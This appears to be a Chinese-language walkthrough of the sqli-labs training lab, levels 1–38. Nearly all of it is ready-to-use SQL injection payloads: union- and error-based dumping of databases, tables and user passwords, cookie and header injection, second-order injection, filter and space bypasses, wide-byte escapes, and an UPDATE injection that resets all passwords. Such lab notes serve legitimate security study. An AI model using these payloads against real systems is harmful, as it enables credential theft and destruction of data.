1-4联合注入
===

```sql
判断闭合方式 \
爆库    order by 判断列数
        ?id=-2' union select 1,database(),3--+
        ?id=-1' union select 1,group_concat(schema_name) from information_schema.schemata,3 --+
爆表 ?id=-2' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3--+
爆栏    ?id=-2' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+
爆数据  ?id=-1' union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+
```

5-6报错注入
===

```sql
爆库    and updatexml(1,concat(0x7e,(database()),0x7e),1)--+
        and extractvalue(1,concat(0x7e,(select database()),0x7e))

爆表    and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+
        and extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e))--+

爆栏    and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'  and table_schema=database()),1,31),0x7e),1)--+
        and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,31),0x7e))--+
        and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'and    table_schema=database()),0x7e))--+

爆数据  and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1) --+
        and extractvalue(1,concat(0x7e,substr((select group_concat(concat(username,'~',password)) from users),1,31),0x7e)) --+
```

7-10
===
布尔盲注

布尔时间盲注

11-12
===
‘or 1=1,永真判断闭合，#注释掉&password等<br>
联合注入/报错注入
>

13-14
===
（1）报错不回显，盲注
（2）报错注入updatexml,extractvalue

15-16
===
用户和密码均填入‘or 1=1#测试闭合方式
布尔注入和时间盲注

17修改密码（本题危害比较大）
===
```sql
猜测源码update users set password='$p' where username='$u'
用户            admin
密码框猜闭合    ' or 1=1 #
原理            update users set password='' or 1=1 #' where username='admin'
//会把数据库所有密码都改为1
update users set password=1
```

```sql
post data输入：uname=admin&passwd=pass'&submit=Submit

根据报错信息可知闭合是单引号
```

18-22http头注入
===
```sql
正常登录，观察信息,猜测源码
insert into 'security'.'某个表'(uagent,ipadd,username) values('浏览器信息','ip地址','用户名')
修改User-Agent
反斜杠得闭合
' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1
报错注入
insert into 'security'.'某个表'(uagent,ipadd,username) values('' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1','ip地址','用户名')
```

19类似18，但是referer注入点
---
20cookie注入
---
cookie：uname=admin(账号)注入点；判断闭合后admin' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #

21，22
---
cookie进行base64编码的

输入攻击语句之后，转化为base64encode即可

```sql
admin') and extractvalue(1,concat(0x7e,(select database()),0x7e)) #
编码之后
YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkgIw==
```

23#、-- +均被过滤
===
判断闭合后流程

```sql
?id=-2' union select 1,(select group_concat(username) from users),(select group_concat(password) from users)'3
前后均闭合即可
```
24二次注入
===
以 **admin'#**为账号注册
登录成功后即可更改密码
```sql
UPDATE users SET passwd="New_Pass" WHERE username ='admin'#'xxxx
```
25or,and过滤
===
```sql
?id=-1' union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata--+
?id=-1' union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'),3%23
```
26-27奇淫巧计
===
26空格注释被屏蔽
---



```sql
http://192.168.101.16/sqli-labs-master/Less-26/?id=1'aandnd(updatexml(1,concat(0x7e,substr((select (group_concat(schema_name)) from (infoorrmation_schema.schemata)),1,31),0x7e),1))oorr'1'='1
```
27
---
```sql
?id=0'%09uniunionon%09SElect%091,(SELect%0agroup_concat(table_name)%0afrom%09information_schema.tables %09where%09 table_schema='security'),3%09||%09'1'='1
//or '1'='1仅用于闭合
```
28
===
利用id=10000'|| ('1')=('1//一真一假判断出闭合方式</br>
利用union select注入     //注意空格数和空格替换
```sql
?id=0')unionunion%09select%09select%091,(select%09group_concat(table_name) from%09 information_schema.tables%09 where%09table_schema='security'),3||('1')=('1
```
29-31
===
29
---
判断闭合同28
利用 tomcat 与 apache 解析相同请求参数不同的特性</br> 
tomcat 解析相同请求参数取第一个，而 apache 取第二个</br>
如?id=1&id=2 ，tomcat 取得 1 ，apache 取得 2 <br>
联合注入

```sql
?id=1&id=-2' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3--+
```
30
---
同29<br>
"       闭合

31
---
同29<br>

32-33get类宽字节注入
===
addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。
过滤：<br>
 单引号(')<br>
 双引号(")<br>
 反斜杠(\\)<br>

32
---
%5c=\\ ___%bf%5c被识别为汉字,%27='逃逸<br>

```sql
?id=-1%df%27union select 1,database(),3--+
```
33
---
同32,"闭合<br>

34-34post类宽字节注入
===
34
---
burp抓包
在uname=(目标位置)
```sql
admin%df%27 union select 1,2 #
```
把%df%27框起来，右键-convert selection-url–url decode<br>
因为GET会自动把数据进行url解码,POST不会把数据进行url解码，所以我们需要手工操作

35
---
可以联合注入,也可以报错注入

36
---
宽字节注入
```sql
?id=-1%df%27union select 1,2,3 %23
```
37
---
同34

38
---
堆叠注入
